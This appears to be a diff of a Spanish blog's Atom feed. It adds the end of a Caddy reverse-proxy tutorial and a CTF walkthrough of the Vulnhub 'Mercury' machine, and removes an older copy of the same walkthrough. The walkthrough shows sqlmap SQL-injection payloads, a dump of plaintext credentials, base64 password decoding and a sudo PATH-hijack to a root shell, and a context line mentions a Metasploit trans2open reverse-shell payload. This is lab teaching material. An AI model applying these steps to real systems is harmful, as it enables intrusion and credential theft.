function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;tee&lt;/span&gt; /etc/apt/sources.list.d/caddy-stable.list&lt;br&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;apt&lt;/span&gt; update&lt;br&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;apt&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt; caddy&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Vamos a utilizar Caddy como un proxy reverso, este escuchará primero en el puerto 80 para solicitar los certificados SSL/TLS, si el DNS esta apuntando correctamente, el proceso debería ser exitoso y Caddy empezará a escuchar solicitudes HTTP en el puerto 443 utilizando HTTPS, y se comunicará localmente con tu servidor funcionando en el puerto que configures.&lt;/p&gt;
+&lt;p&gt;Caddy funciona mediante archivos de configuración llamados &lt;code&gt;Caddyfile&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;cyberbunny.online {
+    reverse_proxy localhost:8000
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Donde &lt;code&gt;cyberbunny.online&lt;/code&gt; es el dominio, &lt;code&gt;reverse_proxy&lt;/code&gt; el modo en el que queremos que actue Caddy y &lt;code&gt;localhost:8000&lt;/code&gt; la dirección y puerto donde tenemos nuestro servidor web funcionando.&lt;/p&gt;
+&lt;p&gt;Edita el archivo en &lt;code&gt;/etc/caddy/Caddyfile&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Caddy no usará la configuración hasta que lo reinicies con &lt;code&gt;sudo systemctl restart caddy&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Cuando lo reinicies, comprueba el estado de la obtención del certificado con &lt;code&gt;sudo systemctl status caddy&lt;/code&gt;, si ves algo como esto, es que ha funcionado correctamente:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Si la obtención del certificado falló, puede que debas esperar un poco hasta que el DNS se propague, además, Caddy espera varios minutos antes de volver a intentar la obtención del certificado, así que si no funciona a la primera, no te preocupes, espera un poco y vuelve a consultar el estado mas tarde mientras verificas que tu DNS está apuntando correctamente y tu configuración es correcta.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Mientras también puedes arrancar tu servidor web si no lo has hecho ya, Caddy no necesita que el servidor web esté funcionando para obtener el certificado, pero si lo necesitas para comprobar que al final funciona correctamente.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+			
+		</content>
+	</entry>
+	
+	<entry>
+		<title>Vulnhub #4: Mercury</title>
+		<link href="https://update-me.com/posts/mercury/"/>
+		<updated>2025-05-09T00:00:00+00:00</updated>
+		<id>https://update-me.com/posts/mercury/</id>
+		<content type="html">
+		  &lt;p&gt;Puedes descargar la maquina vulnerable desde &lt;a href=&quot;https://www.vulnhub.com/entry/the-planets-mercury,544/&quot;&gt;vulnhub&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;datos&quot;&gt;Datos &lt;a class=&quot;direct-link&quot; href=&quot;#datos&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;IP Atacante: 192.168.0.25&lt;br&gt;
+IP Victima: 192.168.0.31&lt;/p&gt;
+&lt;h2 id=&quot;recon&quot;&gt;Recon &lt;a class=&quot;direct-link&quot; href=&quot;#recon&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap &lt;a class=&quot;direct-link&quot; href=&quot;#nmap&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;datadiego@~ nmap -Pn 192.168.0.31
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 10:50 CET
+Nmap scan report for 192.168.0.31
+Host is up (0.0013s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8080/tcp open  http-proxy
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;web&quot;&gt;Web &lt;a class=&quot;direct-link&quot; href=&quot;#web&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;En la maquina hay un servidor http, en el index solo hay un mensaje en plano:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Hello. This site is currently in development please check back later.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Existe un robots.txt:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;User-agent: * 
+Disallow: /
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Si intentamos entrar a cualquier otra pagina que no existe:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+Page not found (404)
+Request Method: 	GET
+Request URL: 	http://192.168.0.31:8080/hello
+
+Using the URLconf defined in mercury_proj.urls, Django tried these URL patterns, in this order:
+
+    [name=&#39;index&#39;]
+    robots.txt [name=&#39;robots&#39;]
+    mercuryfacts/
+
+The current path, hello, didn&#39;t match any of these.
+
+You&#39;re seeing this error because you have DEBUG = True in your Django settings file. Change that to False, and Django will display a standard 404 page.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora sabemos que el servidor es un django, y que existe un endpoint &lt;code&gt;mercuryfacts&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Cuando accedemos a /mercuryfacts encontramos otros dos endpoints:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;/mercuryfacts/todo&lt;/li&gt;
+&lt;li&gt;/mercuryfacts/:number&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;En la lista de /todo:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; Still todo:
+
+    Add CSS.
+    Implement authentication (using users table)
+    Use models in django instead of direct mysql call
+    All the other stuff, so much!!!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Lanzamos sqlmap:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sqlmap -u http://192.168.0.31:8080/mercuryfacts/ --dbs --batch
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Encuentra lo siguiente:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sqlmap identified the following injection point(s) with a total of 1876 HTTP(s) requests:
+---
+Parameter: #1* (URI)
+    Type: error-based
+    Title: MySQL &amp;gt;= 5.6 error-based - Parameter replace (GTID_SUBSET)
+    Payload: http://192.168.0.31:8080/mercuryfacts/GTID_SUBSET(CONCAT(0x7170706b71,(SELECT (ELT(7619=7619,1))),0x7170707a71),7619)
+
+    Type: time-based blind
+    Title: MySQL &amp;gt;= 5.0.12 time-based blind - Parameter replace
+    Payload: http://192.168.0.31:8080/mercuryfacts/(CASE WHEN (5772=5772) THEN SLEEP(5) ELSE 5772 END)
+
+    Type: UNION query
+    Title: MySQL UNION query (random number) - 1 column
+    Payload: http://192.168.0.31:8080/mercuryfacts/-9431 UNION ALL SELECT CONCAT(0x7170706b71,0x746152665350437975484f575550785542644a64465743704a555253535467456c67735377476378,0x7170707a71)#
+---
+[05:11:02] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL &amp;gt;= 5.6
+[05:11:02] [INFO] fetching database names
+available databases [2]:
+[*] information_schema
+[*] mercury
+
+[05:11:02] [INFO] fetched data logged to text files under &#39;/home/kali/.local/share/sqlmap/output/192.168.0.31&#39;
+
+[*] ending @ 05:11:02 /2025-02-11/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Sacamos datos de las tablas con:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sqlmap -u http://192.168.0.31:8080/mercuryfacts/ --current-db -D mercury --batch --dump-all
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Encontramos lo siguiente:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[05:50:50] [INFO] fetching entries for table &#39;users&#39; in database &#39;mercury&#39;
+Database: mercury
+Table: users
+[4 entries]
++----+-------------------------------+-----------+
+| id | password                      | username  |
++----+-------------------------------+-----------+
+| 1  | johnny1987                    | john      |
+| 2  | lovemykids111                 | laura     |
+| 3  | lovemybeer111                 | sam       |
+| 4  | mercuryisthesizeof0.056Earths | webmaster |
++----+-------------------------------+-----------+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ningun usuario funciona en SSH excepto &lt;code&gt;webmaster&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Encontramos la user_flag.txt:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;user_flag_8339915c9a454657bd60ee58776f4ccd
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En &lt;code&gt;/etc/passwd&lt;/code&gt; encontramos otro usuario:&lt;br&gt;
+linuxmaster:x:1002:1002:,,,:/home/linuxmaster:/bin/bash&lt;/p&gt;
+&lt;p&gt;Encontramos el hash de ambos:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;webmaster@mercury:~$ cat mercury_proj/notes.txt 
+Project accounts (both restricted):
+webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
+linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Descodificamos la contraseña:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;webmaster@mercury:~/mercury_proj/mercury_proj$ echo &amp;quot;bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==&amp;quot; | base64 -d
+mercurymeandiameteris4880km
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Entramos por SSH o mediante &lt;code&gt;su linuxmaster&lt;/code&gt; y comprobamos permisos con sudo -l:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;linuxmaster@mercury:~$ sudo -l
+[sudo] password for linuxmaster: 
+Matching Defaults entries for linuxmaster on mercury:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin&#92;:/usr/local/bin&#92;:/usr/sbin&#92;:/usr/bin&#92;:/sbin&#92;:/bin&#92;:/snap/bin
+
+User linuxmaster may run the following commands on mercury:
+    (root : root) SETENV: /usr/bin/check_syslog.sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Comprobamos el archivo:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;linuxmaster@mercury:~$ cat /usr/bin/check_syslog.sh 
+#!/bin/bash
+tail -n 10 /var/log/syslog
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;El comando se esta ejecutando directamente, sin especificar la ruta absoluta, por lo que es vulnerable a &lt;code&gt;path hijacking&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Podemos hacer lo siguiente:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;linuxmaster@mercury:~$ mkdir /tmp/malito
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Dentro del directorio, creamos un &lt;code&gt;.sh&lt;/code&gt; que ejecute una shell con nano:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/bin/bash
+/bin/bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Damos permisos con &lt;code&gt;chmod +x /tmp/malito/tail&lt;/code&gt;.&lt;br&gt;
+Exportamos la variable con &lt;code&gt;export PATH=/tmp/malito:$PATH&lt;/code&gt;&lt;br&gt;
+Ejecutamos el script utilizando la variable de entorno con &lt;code&gt;sudo --preserve-env=PATH /usr/bin/check_syslog.sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Obtenemos acceso a root!&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;linuxmaster@mercury:~$ cd /tmp/malito/
+linuxmaster@mercury:/tmp/malito$ ls
+linuxmaster@mercury:/tmp/malito$ nano tail
+linuxmaster@mercury:/tmp/malito$ ls
+tail
+linuxmaster@mercury:/tmp/malito$ chmod +x /tmp/malito/tail 
+linuxmaster@mercury:/tmp/malito$ export PATH=/tmp/malito:$PATH
+linuxmaster@mercury:/tmp/malito$ sudo --preserve-env=PATH /usr/bin/check_syslog.sh 
+[sudo] password for linuxmaster: 
+root@mercury:/tmp/malito# whoami
+root
+root@mercury:/tmp/malito# 
+&lt;/code&gt;&lt;/pre&gt;
 
 			
 		</content>
@@ -443,173 +610,6 @@ Shellcodes: No Results
 &lt;p&gt;En concreto, aqui tenemos la vulnerabilidad trans2open, podemos buscarla con &lt;code&gt;search trans2open&lt;/code&gt; en metasploit.&lt;/p&gt;
 &lt;p&gt;Debemos configurar el payload con &lt;code&gt;set payload linux/x86/shell_reverse_tcp&lt;/code&gt; y el rhosts.&lt;/p&gt;
 &lt;p&gt;Al lanzarlo con run obtenemos una shell con usuario root.&lt;/p&gt;
-
-			
-		</content>
-	</entry>
-	
-	<entry>
-		<title>Vulnhub #4: Mercury</title>
-		<link href="https://update-me.com/posts/mercury/"/>
-		<updated>2025-05-11T00:00:00+00:00</updated>
-		<id>https://update-me.com/posts/mercury/</id>
-		<content type="html">
-		  &lt;p&gt;Puedes descargar la maquina vulnerable desde &lt;a href=&quot;https://www.vulnhub.com/entry/the-planets-mercury,544/&quot;&gt;vulnhub&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&quot;datos&quot;&gt;Datos &lt;a class=&quot;direct-link&quot; href=&quot;#datos&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;IP Atacante: 192.168.0.25&lt;br&gt;
-IP Victima: 192.168.0.31&lt;/p&gt;
-&lt;h2 id=&quot;recon&quot;&gt;Recon &lt;a class=&quot;direct-link&quot; href=&quot;#recon&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap &lt;a class=&quot;direct-link&quot; href=&quot;#nmap&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-&lt;pre&gt;&lt;code&gt;datadiego@~ nmap -Pn 192.168.0.31
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 10:50 CET
-Nmap scan report for 192.168.0.31
-Host is up (0.0013s latency).
-Not shown: 998 closed tcp ports (conn-refused)
-PORT     STATE SERVICE
-22/tcp   open  ssh
-8080/tcp open  http-proxy
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&quot;web&quot;&gt;Web &lt;a class=&quot;direct-link&quot; href=&quot;#web&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;En la maquina hay un servidor http, en el index solo hay un mensaje en plano:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Hello. This site is currently in development please check back later.
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Existe un robots.txt:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;User-agent: * 
-Disallow: /
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Si intentamos entrar a cualquier otra pagina que no existe:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;
-Page not found (404)
-Request Method: 	GET
-Request URL: 	http://192.168.0.31:8080/hello
-
-Using the URLconf defined in mercury_proj.urls, Django tried these URL patterns, in this order:
-
-    [name=&#39;index&#39;]
-    robots.txt [name=&#39;robots&#39;]
-    mercuryfacts/
-
-The current path, hello, didn&#39;t match any of these.
-
-You&#39;re seeing this error because you have DEBUG = True in your Django settings file. Change that to False, and Django will display a standard 404 page.
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Ahora sabemos que el servidor es un django, y que existe un endpoint &lt;code&gt;mercuryfacts&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;Cuando accedemos a /mercuryfacts encontramos otros dos endpoints:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;/mercuryfacts/todo&lt;/li&gt;
-&lt;li&gt;/mercuryfacts/:number&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;En la lista de /todo:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt; Still todo:
-
-    Add CSS.
-    Implement authentication (using users table)
-    Use models in django instead of direct mysql call
-    All the other stuff, so much!!!
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Lanzamos sqlmap:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;sqlmap -u http://192.168.0.31:8080/mercuryfacts/ --dbs --batch
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Encuentra lo siguiente:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;sqlmap identified the following injection point(s) with a total of 1876 HTTP(s) requests:
----
-Parameter: #1* (URI)
-    Type: error-based
-    Title: MySQL &amp;gt;= 5.6 error-based - Parameter replace (GTID_SUBSET)
-    Payload: http://192.168.0.31:8080/mercuryfacts/GTID_SUBSET(CONCAT(0x7170706b71,(SELECT (ELT(7619=7619,1))),0x7170707a71),7619)
-
-    Type: time-based blind
-    Title: MySQL &amp;gt;= 5.0.12 time-based blind - Parameter replace
-    Payload: http://192.168.0.31:8080/mercuryfacts/(CASE WHEN (5772=5772) THEN SLEEP(5) ELSE 5772 END)
-
-    Type: UNION query
-    Title: MySQL UNION query (random number) - 1 column
-    Payload: http://192.168.0.31:8080/mercuryfacts/-9431 UNION ALL SELECT CONCAT(0x7170706b71,0x746152665350437975484f575550785542644a64465743704a555253535467456c67735377476378,0x7170707a71)#
----
-[05:11:02] [INFO] the back-end DBMS is MySQL
-back-end DBMS: MySQL &amp;gt;= 5.6
-[05:11:02] [INFO] fetching database names
-available databases [2]:
-[*] information_schema
-[*] mercury
-
-[05:11:02] [INFO] fetched data logged to text files under &#39;/home/kali/.local/share/sqlmap/output/192.168.0.31&#39;
-
-[*] ending @ 05:11:02 /2025-02-11/
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Sacamos datos de las tablas con:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;sqlmap -u http://192.168.0.31:8080/mercuryfacts/ --current-db -D mercury --batch --dump-all
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Encontramos lo siguiente:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;[05:50:50] [INFO] fetching entries for table &#39;users&#39; in database &#39;mercury&#39;
-Database: mercury
-Table: users
-[4 entries]
-+----+-------------------------------+-----------+
-| id | password                      | username  |
-+----+-------------------------------+-----------+
-| 1  | johnny1987                    | john      |
-| 2  | lovemykids111                 | laura     |
-| 3  | lovemybeer111                 | sam       |
-| 4  | mercuryisthesizeof0.056Earths | webmaster |
-+----+-------------------------------+-----------+
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Ningun usuario funciona en SSH excepto &lt;code&gt;webmaster&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;Encontramos la user_flag.txt:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;user_flag_8339915c9a454657bd60ee58776f4ccd
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;En &lt;code&gt;/etc/passwd&lt;/code&gt; encontramos otro usuario:&lt;br&gt;
-linuxmaster:x:1002:1002:,,,:/home/linuxmaster:/bin/bash&lt;/p&gt;
-&lt;p&gt;Encontramos el hash de ambos:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;webmaster@mercury:~$ cat mercury_proj/notes.txt 
-Project accounts (both restricted):
-webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
-linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Descodificamos la contraseña:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;webmaster@mercury:~/mercury_proj/mercury_proj$ echo &amp;quot;bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==&amp;quot; | base64 -d
-mercurymeandiameteris4880km
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Entramos por SSH o mediante &lt;code&gt;su linuxmaster&lt;/code&gt; y comprobamos permisos con sudo -l:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;linuxmaster@mercury:~$ sudo -l
-[sudo] password for linuxmaster: 
-Matching Defaults entries for linuxmaster on mercury:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin&#92;:/usr/local/bin&#92;:/usr/sbin&#92;:/usr/bin&#92;:/sbin&#92;:/bin&#92;:/snap/bin
-
-User linuxmaster may run the following commands on mercury:
-    (root : root) SETENV: /usr/bin/check_syslog.sh
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Comprobamos el archivo:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;linuxmaster@mercury:~$ cat /usr/bin/check_syslog.sh 
-#!/bin/bash
-tail -n 10 /var/log/syslog
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;El comando se esta ejecutando directamente, sin especificar la ruta absoluta, por lo que es vulnerable a &lt;code&gt;path hijacking&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;Podemos hacer lo siguiente:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;linuxmaster@mercury:~$ mkdir /tmp/malito
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Dentro del directorio, creamos un &lt;code&gt;.sh&lt;/code&gt; que ejecute una shell con nano:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;#!/bin/bash
-/bin/bash
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Damos permisos con &lt;code&gt;chmod +x /tmp/malito/tail&lt;/code&gt;.&lt;br&gt;
-Exportamos la variable con &lt;code&gt;export PATH=/tmp/malito:$PATH&lt;/code&gt;&lt;br&gt;
-Ejecutamos el script utilizando la variable de entorno con &lt;code&gt;sudo --preserve-env=PATH /usr/bin/check_syslog.sh&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;Obtenemos acceso a root!&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;linuxmaster@mercury:~$ cd /tmp/malito/
-linuxmaster@mercury:/tmp/malito$ ls
-linuxmaster@mercury:/tmp/malito$ nano tail
-linuxmaster@mercury:/tmp/malito$ ls
-tail
-linuxmaster@mercury:/tmp/malito$ chmod +x /tmp/malito/tail 
-linuxmaster@mercury:/tmp/malito$ export PATH=/tmp/malito:$PATH
-linuxmaster@mercury:/tmp/malito$ sudo --preserve-env=PATH /usr/bin/check_syslog.sh 
-[sudo] password for linuxmaster: 
-root@mercury:/tmp/malito# whoami
-root
-root@mercury:/tmp/malito# 
-&lt;/code&gt;&lt;/pre&gt;
 
 			
 		</content>
